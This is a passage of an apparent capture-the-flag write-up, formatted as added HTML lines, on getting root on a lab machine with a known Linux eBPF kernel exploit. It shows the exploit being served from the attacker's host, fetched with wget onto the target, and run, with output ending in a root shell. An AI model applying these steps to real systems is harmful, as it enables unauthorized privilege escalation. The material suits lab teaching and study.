+<h3 id="kernel-exploitation">Kernel Exploitation</h3>
+
+<p>We can’t finish our mission without get root, the kernel version for this system allows for arbitrary read/write access to the linux kernel, bypassing SMEP/SMAP, you can download the exploit <a href="https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/linux/local/45010.c">here</a>.</p>
+
+<p>I started a web server with php on my local machine on port 80.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>php <span class="nt">-S</span> 192.168.179.1:80 
+</code></pre></div></div>
+
+<p>Then I transferred the exploit to the target machine, compiled it and ran it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bigtommysenior@CallahanAutoSrv01:/tmp<span class="nv">$ </span>wget 192.168.179.1/45010.c <span class="nt">-O</span> r00t.c
+
+bigtommysenior@CallahanAutoSrv01:/tmp<span class="nv">$ </span>./r00t 
+<span class="o">[</span>.] 
+<span class="o">[</span>.] t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span> exploit <span class="k">for </span>counterfeit grsec kernels such as KSPP and linux-hardened t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span>
+<span class="o">[</span>.] 
+<span class="o">[</span>.]   <span class="k">**</span> This vulnerability cannot be exploited at all on authentic grsecurity kernel <span class="k">**</span>
+<span class="o">[</span>.] 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating bpf map
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sneaking evil bpf past the verifier
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating socketpair<span class="o">()</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> attaching bpf backdoor to socket
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> skbuff <span class="o">=&gt;</span> ffff880016d9b500
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leaking sock struct from ffff880016d38000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sock-&gt;sk_rcvtimeo at offset 472
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cred structure at ffff8800130aa780
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> UID from cred structure: 1002, matches the current: 1002
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> hammering cred structure at ffff8800130aa780
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> credentials patched, launching shell...
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>bigtommysenior<span class="o">)</span>
+</code></pre></div></div>
+
+:ET
